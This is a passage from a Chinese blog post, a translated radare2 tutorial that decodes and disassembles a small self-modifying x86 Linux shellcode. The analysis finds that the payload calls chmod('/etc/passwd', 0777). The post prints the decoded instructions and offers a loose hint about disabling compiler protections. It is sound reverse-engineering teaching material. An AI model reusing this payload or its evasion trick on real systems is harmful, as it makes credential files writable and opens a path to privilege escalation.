<p><code>0x0804a047</code>开始将<code>[esi+ecx-0x1]</code>地址的内容减<code>0x35</code><br><code>0x3c00104c</code>将<code>ecx</code>减1<br><code>0x3c00104f</code>如果<code>ecx</code>不为零循环到<code>0x0804a047</code></p>
<p><code>ecx</code>是<code>{0x27, 0x26,...,0x1}</code>，<code>esi</code>已知。所以通过计算，需要将从<code>0x0804a058</code>开始的<code>0x27</code>字节减去<code>0x35</code>。为了模拟这个自修改代码的效果。可以使用<code>wo</code>系列命令。查看相关帮助：</p>
<pre><code>[0x080483a0]&gt; wo?
|<span class="string">Usage: wo[asmdxoArl24] [hexpairs] @ addr[:bsize]
</span>|<span class="string">Example:
</span>|<span class="string">  wox 0x90   ; xor cur block with 0x90
</span>|<span class="string">  wox 90     ; xor cur block with 0x90
</span>|<span class="string">  wox 0x0203 ; xor cur block with 0203
</span>|<span class="string">  woa 02 03  ; add [0203][0203][...] to curblk
</span>|<span class="string">  woe 02 03  
</span>|<span class="string">Supported operations:
</span>|<span class="string">  wow  ==  write looped value (alias for 'wb')
</span>|<span class="string">  woa  +=  addition
</span>|<span class="string">  wos  -=  substraction
</span>|<span class="string">  wom  *=  multiply
</span>|<span class="string">  wod  /=  divide
</span>|<span class="string">  wox  ^=  xor
</span>|<span class="string">  woo  </span>|<span class="string">=  or
</span>|<span class="string">  woA  &amp;=  and
</span>|<span class="string">  woR  random bytes (alias for 'wr $b'
</span>|<span class="string">  wor  &gt;&gt;= shift right
</span>|<span class="string">  wol  &lt;&lt;= shift left
</span>|<span class="string">  wo2  2=  2 byte endian swap
</span>|<span class="string">  wo4  4=  4 byte endian swap</span>
</code></pre><p>使用<code>wos</code>从一段内存地址中减去一个常量。但首先要打开输入输出缓存(io cache)。默认情况下radare2以只读方式打开文件，除非以<code>-w</code>标志打开。或者，设置<code>io.cache</code>为<code>true</code>，在内润中缓存写入内容。用户可随意撤销或者提交这些写入，暂不用讨论这些细节。</p>
<pre><code>[<span class="number">0x080483a0</span>]&gt; e io.cache=true
[<span class="number">0x080483a0</span>]&gt; wos <span class="number">0x35</span>@<span class="number">0x0804a058</span>:<span class="number">0x27</span>
[<span class="number">0x080483a0</span>]&gt; pDi <span class="number">30</span>@sym.shellcode 
<span class="number">0x0804a040</span>              eb11  <span class="keyword">jmp</span> <span class="number">0x804a053</span>
<span class="number">0x0804a042</span>                5e  <span class="keyword">pop</span> <span class="literal">esi</span>
<span class="number">0x0804a043</span>              31c9  <span class="keyword">xor</span> <span class="literal">ecx</span>, <span class="literal">ecx</span>
<span class="number">0x0804a045</span>              b127  <span class="keyword">mov</span> <span class="literal">cl</span>, <span class="number">0x27</span>
<span class="number">0x0804a047</span>        806c0eff35  <span class="keyword">sub</span> <span class="preprocessor">byte</span> [<span class="literal">esi</span>+<span class="literal">ecx</span>-<span class="number">0x1</span>], <span class="number">0x35</span>
<span class="number">0x0804a04c</span>            80e901  <span class="keyword">sub</span> <span class="literal">cl</span>, <span class="number">0x1</span>
<span class="number">0x0804a04f</span>              75f6  <span class="keyword">jne</span> <span class="number">0x804a047</span>
<span class="number">0x0804a051</span>              eb05  <span class="keyword">jmp</span> <span class="number">0x804a058</span>
<span class="number">0x0804a053</span>        e8eaffffff  <span class="keyword">call</span> <span class="number">0x804a042</span>
<span class="number">0x0804a058</span>              eb15  <span class="keyword">jmp</span> <span class="number">0x804a06f</span>
<span class="number">0x0804a05a</span>              31c0  <span class="keyword">xor</span> <span class="literal">eax</span>, <span class="literal">eax</span>
<span class="number">0x0804a05c</span>              b00f  <span class="keyword">mov</span> <span class="literal">al</span>, <span class="number">0xf</span>
<span class="number">0x0804a05e</span>                5b  <span class="keyword">pop</span> <span class="literal">ebx</span>
<span class="number">0x0804a05f</span>              31c9  <span class="keyword">xor</span> <span class="literal">ecx</span>, <span class="literal">ecx</span>
<span class="number">0x0804a061</span>          66b9ff01  <span class="keyword">mov</span> <span class="literal">cx</span>, <span class="number">0x1ff</span>
<span class="number">0x0804a065</span>              cd80  <span class="keyword">int</span> <span class="number">0x80</span>
<span class="number">0x0804a067</span>              31c0  <span class="keyword">xor</span> <span class="literal">eax</span>, <span class="literal">eax</span>
<span class="number">0x0804a069</span>              b001  <span class="keyword">mov</span> <span class="literal">al</span>, <span class="number">0x1</span>
<span class="number">0x0804a06b</span>              31<span class="pseudo">db</span>  <span class="keyword">xor</span> <span class="literal">ebx</span>, <span class="literal">ebx</span>
<span class="number">0x0804a06d</span>              cd80  <span class="keyword">int</span> <span class="number">0x80</span>
<span class="number">0x0804a06f</span>        e8e6ffffff  <span class="keyword">call</span> <span class="number">0x804a05a</span>
<span class="number">0x0804a074</span>                2f  <span class="keyword">das</span>
<span class="number">0x0804a075</span>            <span class="number">657463</span>  <span class="keyword">je</span> <span class="number">0x804a0db</span>
<span class="number">0x0804a078</span>                2f  <span class="keyword">das</span>
<span class="number">0x0804a079</span>              <span class="number">7061</span>  <span class="keyword">jo</span> <span class="number">0x804a0dc</span>
<span class="number">0x0804a07b</span>              <span class="number">7373</span>  <span class="keyword">jae</span> <span class="number">0x804a0f0</span>
<span class="number">0x0804a07d</span>              <span class="number">7764</span>  <span class="keyword">ja</span> <span class="number">0x804a0e3</span>
<span class="number">0x0804a07f</span>                cb  <span class="keyword">retf</span>
<span class="number">0x0804a080</span>              120e  <span class="keyword">adc</span> <span class="literal">cl</span>, [<span class="literal">esi</span>]
<span class="number">0x0804a082</span>                0e  <span class="keyword">push</span> <span class="literal">cs</span>
</code></pre><p>看到<code>0x0804a058</code>之后的指令开始有效。我先看到个<code>int 0x80</code>指令。在UNIX类系统中，<code>0x80</code>终端有特殊含义：要求内核执行系统调用，系统调用号储存在<code>eax</code>中。</p>
<p>通过人工执行(通过跳转和调用)，可得<code>eax</code>在<code>0x0804a065</code>是<code>0xf</code>，在<code>0x0804a06d</code>是<code>0x1</code>。然后google下或者随便参考下x86内核头文件就知道是哪些系统调用了。</p>
<p>可查得在<code>0x0804a065</code>调用<code>chmod</code>，接着在<code>0x0804a06d</code>调用<code>exit</code>。接着检查调用参数弄清这些调用做了什么。在linux系统中，调用参数在寄存器中(<code>ebx</code>,<code>ecx</code>,<code>edx</code>, <code>esi</code>, <code>edi</code>, <code>ebp</code>)。</p>
<p><code>chmod</code>有两个参数：分别在<code>ebx</code>和<code>ecx</code>中有指向文件路径的字符指针和模式(<code>mode_t</code>，只是一个指定想要更改成的模式或者权限的整数)。<code>ebx</code>在<code>0x0804a05e</code>从栈顶弹出，向回溯源看到栈上最顶的东西是<code>0x0804a06f</code>调用的返回地址(<code>0x0804a074</code>)。当然，这根本不是返回地址，就是一种巧妙的将字符串打包到有效载荷中的方式(shellcode动态寻址)。使用<code>ps</code>命令看看它是啥：</p>
<pre><code><span class="special">[</span>0x080483a0<span class="special">]</span>&gt; ps@0x0804a074
/etc/passwd<span class="command">\xcb</span><span class="command">\x</span>12<span class="command">\x</span>0e<span class="command">\x</span>0e<span class="command">\x</span>05<span class="command">\xeb</span><span class="command">\xf</span>3<span class="command">\x</span>1209?::<span class="command">\xeb</span><span class="command">\xff</span><span class="command">\xf</span>9<span class="command">\x</span>02<span class="command">\xf</span>9<span class="command">\xfe</span><span class="command">\xf</span>8=<span class="command">\xfc</span><span class="command">\xeb</span>;<span class="command">\xfc</span><span class="command">\xf</span>9<span class="command">\xfe</span><span class="command">\xf</span>7<span class="command">\xeb</span>;40<span class="command">\xf</span>8<span class="command">\xfb</span><span class="command">\xf</span>9
</code></pre><p><code>chmod</code>的第二个参数在<code>ecx</code>中。值是<code>0x1ff</code>，换算成八进制就是<code>0777</code></p>
<pre><code>(gdb) p/o <span class="number">0x1ff</span>
<span class="variable">$2</span> = <span class="number">0777</span>
</code></pre><p>所以调用就是<code>chmod(&#39;/etc/passwd&#39;, 0777)</code></p>
<p>之后仅仅是调用<code>exit</code>退出程序。</p>
<h2 id="总结评论">总结评论</h2><p>这里是一个在运行时动态改变自身来对抗静态分析的shellcode。该技术并不新奇，确是逃避硬编码检测的简单方法。</p>
<p>现代操作系统中这个shellcode不起作用，因为有效载荷在二进制文件的<code>.data</code>区，不可写也不可执行…………译者表示这扯远了不管它，通过使用gcc的参数<code>-fno-stack-protector execstack</code>等应该可以把这些保护关上，大概吧，记不清楚了。</p>
<p>如果想有点挑战性，试试精简过的(stripped)的二进制文件！</p>
<p>有评论告诉我。</p>
<hr>
<p>以下是译者的题外话：</p>
<p>Recent：</p>
<ul>
<li>coursera crypto-11</li>
<li>statistics for engineers and the sciences</li>
<li>coursera pred-003, I give up follow this course</li>
<li>Xie Yihui，现代统计图形</li>
<li>python for data analysis</li>
</ul>
<p>Next?: append</p>
<ul>
<li>Wikibooks:x86 assembly, <a href="http://en.wikibooks.org/wiki/X86_Disassembly" target="_blank" rel="external">http://en.wikibooks.org/wiki/X86_Disassembly</a></li>
<li>phrack radare: <a href="http://phrack.org/issues/66/14.html" target="_blank" rel="external">http://phrack.org/issues/66/14.html</a></li>
<li>crackme: <a href="http://dustri.org/b/defeating-ioli-with-radare2.html" target="_blank" rel="external">http://dustri.org/b/defeating-ioli-with-radare2.html</a></li>
</ul>
<p>Future:</p>
<p>The elements of statistical learning?</p>
</span>
      
    </div>

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/reverse-engineer/" rel="tag">#reverse-engineer</a>
          
        </div>
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/linux/2014/07/26/upgrade-gentoo-linux/" rel="next" title="Upgrade Gentoo Linux">
                <i class="fa fa-chevron-left"></i> Upgrade Gentoo Linux
              </a>
            
          </div>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/uncategorized/2014/08/08/better-and-beautiful-console/" rel="prev" title="Better and Beautiful Console">
                Better and Beautiful Console <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </article>



    <div class="post-spread">
      
    </div>
  </div>


        </div>

        


        
  <div class="comments" id="comments">
    
      <div id="disqus_thread">
        <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
      </div>
    
  </div>


      </div>

      
        
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview sidebar-panel ">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" src="/images/default_avatar.jpg" alt="Liu Yuyang" itemprop="image"/>
          <p class="site-author-name" itemprop="name">Liu Yuyang</p>
        </div>
        <p class="site-description motion-element" itemprop="description">我希望生活是诗的，是画的，是无数动听的音符。我希望我是自由的，摇滚的，有一颗黑客的心。</p>
        <nav class="site-state motion-element">
          <div class="site-state-item site-state-posts">
            <a href="/archives">
              <span class="site-state-item-count">167</span>
              <span class="site-state-item-name">日志</span>
            </a>
          </div>

          <div class="site-state-item site-state-categories">
            
              <span class="site-state-item-count">23</span>
              <span class="site-state-item-name">分类</span>
              
          </div>

          <div class="site-state-item site-state-tags">
            <a href="/tags">
              <span class="site-state-item-count">57</span>
              <span class="site-state-item-name">标签</span>
              </a>
          </div>

        </nav>

        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/reverland" target="_blank">
                  
                    <i class="fa fa-github"></i> GitHub
                  
                </a>
              </span>
            
          
        </div>

        
        

        <div class="links-of-author motion-element">
          
        </div>

      </section>

      
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc-indicator-top post-toc-indicator">
            <i class="fa fa-angle-double-up"></i>
          </div>
          <div class="post-toc">
            
              
            
            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Shellcode"><span class="nav-number">1.</span> <span class="nav-text">Shellcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#60字节的chmod_777多态x86_Linux_Shellcode"><span class="nav-number">2.</span> <span class="nav-text">60字节的chmod 777多态x86 Linux Shellcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实用Radare2分析"><span class="nav-number">3.</span> <span class="nav-text">实用Radare2分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结评论"><span class="nav-number">4.</span> <span class="nav-text">总结评论</span></a></li></ol></div>
            
          </div>
          <div class="post-toc-indicator-bottom post-toc-indicator">
            <i class="fa fa-angle-double-down"></i>
          </div>
        </section>
      

    </div>
  </aside>


      
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy;  2011 - 
  <span itemprop="copyrightYear">2015</span>
  <span class="with-love">
    <i class="icon-next-heart fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Liu Yuyang</span>
</div>

<div class="powered-by">
  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
</div>

<div class="theme-info">
  主题 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT
  </a>
</div>



      </div>
    </footer>

    <div class="back-to-top"></div>
  </div>

  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>

  
  

  
    
    

  

    <script type="text/javascript">
      var disqus_shortname = 'reverlandblog';
      var disqus_identifier = 'exploit/2014/08/07/radare2-shellcode/';
      var disqus_title = 'Radare2小试: 简单shellcode分析(意译)';
      var disqus_url = 'http://reverland.org/exploit/2014/08/07/radare2-shellcode/';

      function run_disqus_script(disqus_script){
        var dsq = document.createElement('script');
        dsq.type = 'text/javascript';
        dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
      }

      run_disqus_script('count.js');
      
        run_disqus_script('embed.js');
      
    </script>
  


  

  
  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.5.2"></script>


  <script type="text/javascript" src="/js/helpers.js?v=0.4.5.2"></script>
  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
<script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>

<script type="text/javascript" src="/js/motion.js?v=0.4.5.2" id="motion.global"></script>


  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  
<script type="text/javascript" src="/js/bootstrap.scrollspy.js?v=0.4.5.2" id="bootstrap.scrollspy.custom"></script>


<script type="text/javascript" id="sidebar.toc.highlight">
  $(document).ready(function () {
    var tocSelector = '.post-toc';
    var $tocSelector = $(tocSelector);
    var activeCurrentSelector = '.active-current';

    $tocSelector
      .on('activate.bs.scrollspy', function () {
        var $currentActiveElement = $(tocSelector + ' .active').last();

        removeCurrentActiveClass();
        $currentActiveElement.addClass('active-current');

        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
      })
      .on('clear.bs.scrollspy', function () {
        removeCurrentActiveClass();
      });

    function removeCurrentActiveClass () {
      $(tocSelector + ' ' + activeCurrentSelector)
        .removeClass(activeCurrentSelector.substring(1));
    }

    function processTOC () {
      getTOCMaxHeight();
      toggleTOCOverflowIndicators();
    }

    function getTOCMaxHeight () {
      var height = $('.sidebar').height() -
                   $tocSelector.position().top -
                   $('.post-toc-indicator-bottom').height();

      $tocSelector.css('height', height);

      return height;
    }

    function toggleTOCOverflowIndicators () {
      tocOverflowIndicator(
        '.post-toc-indicator-top',
        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
      );

      tocOverflowIndicator(
        '.post-toc-indicator-bottom',
        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
      )
    }

    $(document).on('sidebar.motion.complete', function () {
      processTOC();
    });

    $('body').scrollspy({ target: tocSelector });
    $(window).on('resize', function () {
      if ( $('.sidebar').hasClass('sidebar-active') ) {
        processTOC();
      }
    });

    onScroll($tocSelector);

    function onScroll (element) {
      element.on('mousewheel DOMMouseScroll', function (event) {
          var oe = event.originalEvent;
          var delta = oe.wheelDelta || -oe.detail;

          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
          event.preventDefault();

          toggleTOCOverflowIndicators();
      });
    }

    function tocOverflowIndicator (indicator, action) {
      var $indicator = $(indicator);
      var opacity = action === 'show' ? 1 : 0;
      $indicator.velocity ?
        $indicator.velocity('stop').velocity({
          opacity: opacity
        }, { duration: 100 }) :
        $indicator.stop().animate({
          opacity: opacity
        }, 100);
    }

  });
</script>

<script type="text/javascript" id="sidebar.nav">
  $(document).ready(function () {
    var html = $('html');
    var TAB_ANIMATE_DURATION = 200;
    var hasVelocity = $.isFunction(html.velocity);

    $('.sidebar-nav li').on('click', function () {
      var item = $(this);
      var activeTabClassName = 'sidebar-nav-active';
      var activePanelClassName = 'sidebar-panel-active';
      if (item.hasClass(activeTabClassName)) {
        return;
      }

      var currentTarget = $('.' + activePanelClassName);
      var target = $('.' + item.data('target'));

      hasVelocity ?
        currentTarget.velocity('transition.slideUpOut', TAB_ANIMATE_DURATION, function () {
          target
            .velocity('stop')
            .velocity('transition.slideDownIn', TAB_ANIMATE_DURATION)
            .addClass(activePanelClassName);
        }) :
        currentTarget.animate({ opacity: 0 }, TAB_ANIMATE_DURATION, function () {
          currentTarget.hide();
          target
            .stop()
            .css({'opacity': 0, 'display': 'block'})
            .animate({ opacity: 1 }, TAB_ANIMATE_DURATION, function () {
              currentTarget.removeClass(activePanelClassName);
              target.addClass(activePanelClassName);
            });
        });

      item.siblings().removeClass(activeTabClassName);
      item.addClass(activeTabClassName);
    });

    $('.post-toc a').on('click', function (e) {
      e.preventDefault();
      var targetSelector = escapeSelector(this.getAttribute('href'));
      var offset = $(targetSelector).offset().top;
      hasVelocity ?
        html.velocity('stop').velocity('scroll', {
          offset: offset  + 'px',
          mobileHA: false
        }) :
        $('html, body').stop().animate({
          scrollTop: offset
        }, 500);
    });

    // Expand sidebar on post detail page by default, when post has a toc.
    motionMiddleWares.sidebar = function () {
      var $tocContent = $('.post-toc-content');
      if (CONFIG.sidebar === 'post') {
        if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
          displaySidebar();
        }
      }
    };
  });
</script>



  <script type="text/javascript" src="/js/bootstrap.js"></script>

  
  

  
  

</body>
</html>
